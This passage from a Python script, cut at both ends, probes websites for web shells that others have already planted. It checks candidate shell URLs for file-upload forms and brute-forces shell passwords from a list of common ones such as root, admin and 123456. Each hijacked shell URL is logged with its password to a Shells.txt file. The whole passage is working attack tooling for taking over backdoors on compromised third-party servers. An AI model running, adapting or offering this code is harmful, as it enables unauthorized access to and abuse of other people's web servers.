																			print(' # '+site +'/ --> {}[beez3]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH12_J+'#nhzgrf')
																		else :
																			proot = requests.post(SH12_J,data=password_root,timeout=15).content
																			if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																				print(' # '+site +'/ --> {}[beez3]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH12_J+'#root')
																			else :
																				pr00t = requests.post(SH12_J,data=password_r00t,timeout=15).content
																				if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																					print(' # '+site +'/ --> {}[beez3]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH12_J+'#r00t')
																				else :
																					padmin = requests.post(SH12_J,data=password_admin,timeout=15).content
																					if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																						print(' # '+site +'/ --> {}[beez3]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH12_J+'#admin')
																					else :
																						pt00r = requests.post(SH12_J,data=password_t00r,timeout=15).content
																						if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																							print(' # '+site +'/ --> {}[beez3]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH12_J+'#t00r')
																						else :
																							p123 = requests.post(SH12_J,data=password_123,timeout=15).content
																							if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																								print(' # '+site +'/ --> {}[beez3]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH12_J+'#123')
																							else :
																								p1234 = requests.post(SH12_J,data=password_1234,timeout=15).content
																								if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																									print(' # '+site +'/ --> {}[beez3]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH12_J+'#1234')
																								else :
																									p12345 = requests.post(SH12_J,data=password_12345,timeout=15).content
																									if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																										print(' # '+site +'/ --> {}[beez3]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH12_J+'#12345')
																									else :
																										p123456 = requests.post(SH12_J,data=password_123456,timeout=15).content
																										if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																											print(' # '+site +'/ --> {}[beez3]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH12_J+'#123456')
																										else :
																											p123123 = requests.post(SH12_J,data=password_123123,timeout=15).content
																											if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																												print(' # '+site +'/ --> {}[beez3]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH12_J+'#123123')
																											else :
																												p123321 = requests.post(SH12_J,data=password_123321,timeout=15).content
																												if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																													print(' # '+site +'/ --> {}[beez3]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH12_J+'#123321')
																												else :
																													p123456789 = requests.post(SH12_J,data=password_123456789,timeout=15).content
																													if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																														print(' # '+site +'/ --> {}[beez3]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH12_J+'#123456789')
																													else :
																														p1234567890 = requests.post(SH12_J,data=password_1234567890,timeout=15).content
																														if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																															print(' # '+site +'/ --> {}[beez3]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH12_J+'#1234567890')
																														else :
																															phaurgeulis = requests.post(SH12_J,data=password_haurgeulis,timeout=15).content
																															if 'Andela1C3' in phaurgeulis  :
																																print(' # '+site +'/ --> {}[beez3]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH12_J+'#haurgeulis')
																															else :
																																print(' # '+site +' --> {}[Failed]'.format(fr))
																	else :
																		SH13_J_content = requests.get(SH13_J,timeout=15).content
																		if ' type="file"' in SH13_J_content or ' type=\'file\'' in SH13_J_content or ' type= "file"' in SH13_J_content or ' type= \'file\'' in SH13_J_content or ' type = "file"' in SH13_J_content or ' type = \'file\'' in SH13_J_content or ' type ="file"' in SH13_J_content or ' type =\'file\'' in SH13_J_content or ' type=file' in SH13_J_content or ' type =file' in SH13_J_content or ' type= file' in SH13_J_content or ' type = file' in SH13_J_content or 'Upload</a> ]</li><li>[' in SH13_J_content or 'upload</a><li><a>Sym' in SH13_J_content :
																			print(' # '+site +'/ --> {}[beez3]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH13_J+'')
																		elif ' name=pass' in SH13_J_content :
																			nhzgrf = requests.post(SH13_J,data=password_nhzgrf,timeout=15).content
																			if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																				print(' # '+site +'/ --> {}[beez3]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH13_J+'#nhzgrf')
																			else :
																				proot = requests.post(SH13_J,data=password_root,timeout=15).content
																				if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																					print(' # '+site +'/ --> {}[beez3]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH13_J+'#root')
																				else :
																					pr00t = requests.post(SH13_J,data=password_r00t,timeout=15).content
																					if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																						print(' # '+site +'/ --> {}[beez3]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH13_J+'#r00t')
																					else :
																						padmin = requests.post(SH13_J,data=password_admin,timeout=15).content
																						if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																							print(' # '+site +'/ --> {}[beez3]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH13_J+'#admin')
																						else :
																							pt00r = requests.post(SH13_J,data=password_t00r,timeout=15).content
																							if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																								print(' # '+site +'/ --> {}[beez3]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH13_J+'#t00r')
																							else :
																								p123 = requests.post(SH13_J,data=password_123,timeout=15).content
																								if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																									print(' # '+site +'/ --> {}[beez3]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH13_J+'#123')
																								else :
																									p1234 = requests.post(SH13_J,data=password_1234,timeout=15).content
																									if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																										print(' # '+site +'/ --> {}[beez3]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH13_J+'#1234')
																									else :
																										p12345 = requests.post(SH13_J,data=password_12345,timeout=15).content
																										if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																											print(' # '+site +'/ --> {}[beez3]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH13_J+'#12345')
																										else :
																											p123456 = requests.post(SH13_J,data=password_123456,timeout=15).content
																											if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																												print(' # '+site +'/ --> {}[beez3]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH13_J+'#123456')
																											else :
																												p123123 = requests.post(SH13_J,data=password_123123,timeout=15).content
																												if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																													print(' # '+site +'/ --> {}[beez3]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH13_J+'#123123')
																												else :
																													p123321 = requests.post(SH13_J,data=password_123321,timeout=15).content
																													if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																														print(' # '+site +'/ --> {}[beez3]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH13_J+'#123321')
																													else :
																														p123456789 = requests.post(SH13_J,data=password_123456789,timeout=15).content
																														if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																															print(' # '+site +'/ --> {}[beez3]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH13_J+'#123456789')
																														else :
																															p1234567890 = requests.post(SH13_J,data=password_1234567890,timeout=15).content
																															if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																																print(' # '+site +'/ --> {}[beez3]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH13_J+'#1234567890')
																															else :
																																phaurgeulis = requests.post(SH13_J,data=password_haurgeulis,timeout=15).content
																																if 'Andela1C3' in phaurgeulis  :
																																	print(' # '+site +'/ --> {}[beez3]'.format(fg))
																																	with open('Shells.txt', mode='a') as d:
																																		d.write(SH13_J+'#haurgeulis')
																																else :
																																	print(' # '+site +' --> {}[Failed]'.format(fr))
																		else :
																			SH14_J_content = requests.get(SH14_J,timeout=15).content
																			if ' type="file"' in SH14_J_content or ' type=\'file\'' in SH14_J_content or ' type= "file"' in SH14_J_content or ' type= \'file\'' in SH14_J_content or ' type = "file"' in SH14_J_content or ' type = \'file\'' in SH14_J_content or ' type ="file"' in SH14_J_content or ' type =\'file\'' in SH14_J_content or ' type=file' in SH14_J_content or ' type =file' in SH14_J_content or ' type= file' in SH14_J_content or ' type = file' in SH14_J_content or 'Upload</a> ]</li><li>[' in SH14_J_content or 'upload</a><li><a>Sym' in SH14_J_content :
																				print(' # '+site +'/ --> {}[beez5]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH14_J+'')
																			elif ' name=pass' in SH14_J_content :
																				nhzgrf = requests.post(SH14_J,data=password_nhzgrf,timeout=15).content
																				if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																					print(' # '+site +'/ --> {}[beez5]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH14_J+'#nhzgrf')
																				else :
																					proot = requests.post(SH14_J,data=password_root,timeout=15).content
																					if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																						print(' # '+site +'/ --> {}[beez5]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH14_J+'#root')
																					else :
																						pr00t = requests.post(SH14_J,data=password_r00t,timeout=15).content
																						if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																							print(' # '+site +'/ --> {}[beez5]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH14_J+'#r00t')
																						else :
																							padmin = requests.post(SH14_J,data=password_admin,timeout=15).content
																							if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																								print(' # '+site +'/ --> {}[beez5]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH14_J+'#admin')
																							else :
																								pt00r = requests.post(SH14_J,data=password_t00r,timeout=15).content
																								if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																									print(' # '+site +'/ --> {}[beez5]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH14_J+'#t00r')
																								else :
																									p123 = requests.post(SH14_J,data=password_123,timeout=15).content
																									if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																										print(' # '+site +'/ --> {}[beez5]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH14_J+'#123')
																									else :
																										p1234 = requests.post(SH14_J,data=password_1234,timeout=15).content
																										if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																											print(' # '+site +'/ --> {}[beez5]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH14_J+'#1234')
																										else :
																											p12345 = requests.post(SH14_J,data=password_12345,timeout=15).content
																											if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																												print(' # '+site +'/ --> {}[beez5]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH14_J+'#12345')
																											else :
																												p123456 = requests.post(SH14_J,data=password_123456,timeout=15).content
																												if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																													print(' # '+site +'/ --> {}[beez5]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH14_J+'#123456')
																												else :
																													p123123 = requests.post(SH14_J,data=password_123123,timeout=15).content
																													if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																														print(' # '+site +'/ --> {}[beez5]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH14_J+'#123123')
																													else :
																														p123321 = requests.post(SH14_J,data=password_123321,timeout=15).content
																														if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																															print(' # '+site +'/ --> {}[beez5]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH14_J+'#123321')
																														else :
																															p123456789 = requests.post(SH14_J,data=password_123456789,timeout=15).content
																															if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																																print(' # '+site +'/ --> {}[beez5]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH14_J+'#123456789')
																															else :
																																p1234567890 = requests.post(SH14_J,data=password_1234567890,timeout=15).content
																																if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																																	print(' # '+site +'/ --> {}[beez5]'.format(fg))
																																	with open('Shells.txt', mode='a') as d:
																																		d.write(SH14_J+'#1234567890')
																																else :
																																	phaurgeulis = requests.post(SH14_J,data=password_haurgeulis,timeout=15).content
																																	if 'Andela1C3' in phaurgeulis  :
																																		print(' # '+site +'/ --> {}[beez5]'.format(fg))
																																		with open('Shells.txt', mode='a') as d:
																																			d.write(SH14_J+'#haurgeulis')
																																	else :
																																		print(' # '+site +' --> {}[Failed]'.format(fr))
																			else :
																				SH15_J_content = requests.get(SH15_J,timeout=15).content
																				if ' type="file"' in SH15_J_content or ' type=\'file\'' in SH15_J_content or ' type= "file"' in SH15_J_content or ' type= \'file\'' in SH15_J_content or ' type = "file"' in SH15_J_content or ' type = \'file\'' in SH15_J_content or ' type ="file"' in SH15_J_content or ' type =\'file\'' in SH15_J_content or ' type=file' in SH15_J_content or ' type =file' in SH15_J_content or ' type= file' in SH15_J_content or ' type = file' in SH15_J_content or 'Upload</a> ]</li><li>[' in SH15_J_content or 'upload</a><li><a>Sym' in SH15_J_content :
																					print(' # '+site +'/ --> {}[beez5]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH15_J+'')
																				elif ' name=pass' in SH15_J_content :
																					nhzgrf = requests.post(SH15_J,data=password_nhzgrf,timeout=15).content
																					if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																						print(' # '+site +'/ --> {}[beez5]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH15_J+'#nhzgrf')
																					else :
																						proot = requests.post(SH15_J,data=password_root,timeout=15).content
																						if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																							print(' # '+site +'/ --> {}[beez5]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH15_J+'#root')
																						else :
																							pr00t = requests.post(SH15_J,data=password_r00t,timeout=15).content
																							if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																								print(' # '+site +'/ --> {}[beez5]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH15_J+'#r00t')
																							else :
																								padmin = requests.post(SH15_J,data=password_admin,timeout=15).content
																								if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																									print(' # '+site +'/ --> {}[beez5]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH15_J+'#admin')
																								else :
																									pt00r = requests.post(SH15_J,data=password_t00r,timeout=15).content
																									if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																										print(' # '+site +'/ --> {}[beez5]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH15_J+'#t00r')
																									else :
																										p123 = requests.post(SH15_J,data=password_123,timeout=15).content
																										if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																											print(' # '+site +'/ --> {}[beez5]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH15_J+'#123')
																										else :
																											p1234 = requests.post(SH15_J,data=password_1234,timeout=15).content
																											if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																												print(' # '+site +'/ --> {}[beez5]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH15_J+'#1234')
																											else :
																												p12345 = requests.post(SH15_J,data=password_12345,timeout=15).content
																												if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																													print(' # '+site +'/ --> {}[beez5]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH15_J+'#12345')
																												else :
																													p123456 = requests.post(SH15_J,data=password_123456,timeout=15).content
																													if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																														print(' # '+site +'/ --> {}[beez5]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH15_J+'#123456')
																													else :
																														p123123 = requests.post(SH15_J,data=password_123123,timeout=15).content
